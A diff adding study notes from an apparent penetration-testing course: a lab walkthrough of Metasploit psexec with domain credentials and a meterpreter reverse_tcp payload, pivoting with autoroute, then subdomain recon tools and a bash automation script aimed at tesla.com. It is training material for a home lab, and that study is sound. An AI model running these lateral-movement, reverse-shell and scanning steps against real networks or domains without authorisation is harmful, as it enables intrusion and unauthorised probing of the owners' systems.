@@ -3698,6 +3698,300 @@ SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472
 ![[Pasted image 20230401145120.png]]
 
 > [!info] 
-> Commands above from metasploit
+> Commands above are from metasploit
 > 
+
+
+### Pivoting Lab Setup
+
+> [!todo] 
+> - Shutdown both Windows 10 VMs
+
+![[Pasted image 20230401151318.png]]
+
+> [!todo] 
+> - Add `VMnet7` as additional Network Interface to first Windows VM 
+> - Change Network Interface Windows VM No. 2 to `VMnet7`
+> - Boot up VM's
+> - Check IP configuration of both Windows VMs:
+
+![[Pasted image 20230401151809.png]]
+
+![[Pasted image 20230401151831.png]]
+
+### Pivoting Walkthrough
+
+> [!todo] 
+> Start Metasploit on Kali VM:
+> `msfconsole`
+>  `use exploit/windows/smb/psexec`
+>  `set rhost 192.168.203.137`
+>  `set smbdomain marvel.local`
+>  `set smbpass Password1`
+>  `set smbuser fcastle`
+>  `set payload windows/x64/meterpreter/reverse_tcp`
+>  `set lhost eth0`
+>  `set target 2`
+
+![[Pasted image 20230401152444.png]]
+
+![[Pasted image 20230401152609.png]]
+
+> [!todo] 
+> `shell`
+> `route print`
+> `ipconfig`
+> `arp -a`
+
+![[Pasted image 20230401152727.png]]
+
+![[Pasted image 20230401152833.png]]
+
+> [!todo] 
+> `Ctrl C` to leave shell and go back `meterpreter` shell 
+
+> [!todo] 
+> In meterpreter:
+> `run autoroute -s 10.10.10.0/24` 
+
+![[Pasted image 20230401153100.png]]
+
+> [!todo] 
+>  `run autoroute -p`
+
+![[Pasted image 20230401153203.png]]
+
+> [!todo] 
+> `background` 
+
+![[Pasted image 20230401153247.png]]
+
+> [!todo] 
+>  `search portscan`
+>  `use auxiliary/scanner/portscan/tcp`
+>  `options`
+>  `set rhost 10.10.10.128`
+>  `set ports 445`
+
+![[Pasted image 20230401153549.png]]
+
+
+### Cleaning Up
+
+![[Pasted image 20230401153739.png]]
+
+
+## Web Application Enumeration, Revisited
+
+### Installing Go
+
+> [!todo] 
+> Use `pimpmykali` script:
+>  https://github.com/Dewalt-arch/pimpmykali
+>  `sudo ./pimpmykali.sh`
+>  3 - Fix Golang  `3`
+
+
+### Finding Subdomains with Assetfinder
+
+> [!todo] 
+> Install `assetfinder` https://github.com/tomnomnom/assetfinder
+> `apt-get install assetfinder`
+
+> [!todo] 
+>  `assetfinder tesla.com`
+>  `assetfinder tesla.com >> tesla-subdomains.txt` -> To safe to text file
+>  `assetfinder --subs-only tesla.com`
+
+![[Pasted image 20230402102807.png]]
+
+### Finding Subdomains with Amass
+
+> [!todo] 
+> Install Amass by OWASP:
+>  https://github.com/owasp-amass/amass
+>`sudo apt-get update`
+>`sudo apt-get install amass`
+>`amass enum -d tesla.com`
+
+
+### Finding Alive Domains with Httprobe
+
+> [!info] 
+> This tool check if host alive or not 
+
+> [!todo] 
+> Install Httprobe:
+> https://github.com/tomnomnom/httprobe
+> `sudo apt-get install httprobe` 
+> `cat tesla.com/recon/final.txt | httprobe`
+
+
+### Screenshotting Websites with GoWitness
+
+> [!todo] 
+> Install GoWitness:
+> https://github.com/sensepost/gowitness
+> `go install github.com/sensepost/gowitness@latest` 
+> `gowitness single https://tesla.com`
+
+
+### Automating the Enumeration Process
+
+> [!note] 
+> Resources for this video:
+> sumrecon: [https://github.com/thatonetester/sumrecon](https://github.com/thatonetester/sumrecon)
+> TCM's modified script - [https://pastebin.com/MhE6zXVt](https://pastebin.com/MhE6zXVt) 
+
+> [!todo] 
+> Install additional tools
+> `sudo apt-get update`
+>  `sudo apt-get install subjack`
+>  `go install -v github.com/tomnomnom/waybackurls@latest`
+>  
+
+``` 
+#!/bin/bash
+
+######
+# Source script by TCM Security: https://pastebin.com/raw/MhE6zXVt
+# Modify by me
+######
+
+# Go User's home folder
+cd 
+
+url=$1
+
+if [ ! -d "$url" ];then
+	mkdir $url
+fi
+if [ ! -d "$url/recon" ];then
+	mkdir $url/recon
+fi
+#    if [ ! -d '$url/recon/eyewitness' ];then
+#        mkdir $url/recon/eyewitness
+#    fi
+if [ ! -d "$url/recon/scans" ];then
+	mkdir $url/recon/scans
+fi
+if [ ! -d "$url/recon/httprobe" ];then
+	mkdir $url/recon/httprobe
+fi
+if [ ! -d "$url/recon/potential_takeovers" ];then
+	mkdir $url/recon/potential_takeovers
+fi
+if [ ! -d "$url/recon/wayback" ];then
+	mkdir $url/recon/wayback
+fi
+if [ ! -d "$url/recon/wayback/params" ];then
+	mkdir $url/recon/wayback/params
+fi
+if [ ! -d "$url/recon/wayback/extensions" ];then
+	mkdir $url/recon/wayback/extensions
+fi
+if [ ! -f "$url/recon/httprobe/alive.txt" ];then
+	touch $url/recon/httprobe/alive.txt
+fi
+if [ ! -f "$url/recon/final.txt" ];then
+	touch $url/recon/final.txt
+fi
+
+echo "[+] Harvesting subdomains with assetfinder..."
+assetfinder $url >> $url/recon/assets.txt
+cat $url/recon/assets.txt | grep $1 >> $url/recon/final.txt
+rm $url/recon/assets.txt
+
+#echo "[+] Double checking for subdomains with amass..."
+#amass enum -d $url >> $url/recon/f.txt
+#sort -u $url/recon/f.txt >> $url/recon/final.txt
+#rm $url/recon/f.txt
+
+echo "[+] Probing for alive domains..."
+cat $url/recon/final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> $url/recon/httprobe/a.txt
+sort -u $url/recon/httprobe/a.txt > $url/recon/httprobe/alive.txt
+rm $url/recon/httprobe/a.txt
+
+echo "[+] Checking for possible subdomain takeover..."
+
+if [ ! -f "$url/recon/potential_takeovers/potential_takeovers.txt" ];then
+	touch $url/recon/potential_takeovers/potential_takeovers.txt
+fi
+
+subjack -w $url/recon/final.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 -o $url/recon/potential_takeovers/potential_takeovers.txt
+
+echo "[+] Scanning for open ports..."
+nmap -iL $url/recon/httprobe/alive.txt -T4 -oA $url/recon/scans/scanned.txt
+
+echo "[+] Scraping wayback data..."
+cat $url/recon/final.txt | waybackurls >> $url/recon/wayback/wayback_output.txt
+sort -u $url/recon/wayback/wayback_output.txt
+
+echo "[+] Pulling and compiling all possible params found in wayback data..."
+cat $url/recon/wayback/wayback_output.txt | grep '?*=' | cut -d '=' -f 1 | sort -u >> $url/recon/wayback/params/wayback_params.txt
+for line in $(cat $url/recon/wayback/params/wayback_params.txt);do echo $line'=';done
+
+echo "[+] Pulling and compiling js/php/aspx/jsp/json files from wayback output..."
+for line in $(cat $url/recon/wayback/wayback_output.txt);do
+	ext="${line##*.}"
+	if [[ "$ext" == "js" ]]; then
+		echo $line >> $url/recon/wayback/extensions/js1.txt
+		sort -u $url/recon/wayback/extensions/js1.txt >> $url/recon/wayback/extensions/js.txt
+	fi
+	if [[ "$ext" == "html" ]];then
+		echo $line >> $url/recon/wayback/extensions/jsp1.txt
+		sort -u $url/recon/wayback/extensions/jsp1.txt >> $url/recon/wayback/extensions/jsp.txt
+	fi
+	if [[ "$ext" == "json" ]];then
+		echo $line >> $url/recon/wayback/extensions/json1.txt
+		sort -u $url/recon/wayback/extensions/json1.txt >> $url/recon/wayback/extensions/json.txt
+	fi
+	if [[ "$ext" == "php" ]];then
+		echo $line >> $url/recon/wayback/extensions/php1.txt
+		sort -u $url/recon/wayback/extensions/php1.txt >> $url/recon/wayback/extensions/php.txt
+	fi
+	if [[ "$ext" == "aspx" ]];then
+		echo $line >> $url/recon/wayback/extensions/aspx1.txt
+		sort -u $url/recon/wayback/extensions/aspx1.txt >> $url/recon/wayback/extensions/aspx.txt
+	fi
+done
+
+rm $url/recon/wayback/extensions/js1.txt
+rm $url/recon/wayback/extensions/jsp1.txt
+rm $url/recon/wayback/extensions/json1.txt
+rm $url/recon/wayback/extensions/php1.txt
+rm $url/recon/wayback/extensions/aspx1.txt
+
+echo "[+] Running GoWitness against all compiled domains..."
+gowitness file $url/recon/httprobe/alive.txt -d $url/recon/gowitness
+```
+
+
+### Additional Resources
+
+> [!note] 
+> The Bug Hunter's Methodology - [https://www.youtube.com/watch?v=uKWu6yhnhbQ](https://www.youtube.com/watch?v=uKWu6yhnhbQ)
+> Nahamsec Recon Playlist - [https://www.youtube.com/watch?v=MIujSpuDtFY&list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA](https://www.youtube.com/watch?v=MIujSpuDtFY&list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA) 
+
+
+## Testing the Top 10 Web Application Vulnerabilities
+
+
+### The OWASP Top 10 and OWASP Testing Checklist
+
+> [!note] 
+> Resources for this video:
+OWASP Top 10: https://owasp.org/www-pdf-archive/OWASP_Top_10-2017_%28en%29.pdf.pdf
+OWASP Testing Checklist: https://github.com/tanprathan/OWASP-Testing-Checklist
+OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf 
+
+![Mapping](https://owasp.org/Top10/assets/mapping.png)
+
+![[Pasted image 20230402143714.png]]
+
+![[Pasted image 20230402144001.png]]
+
+
+### Installing OWASP Juice Shop
+
 
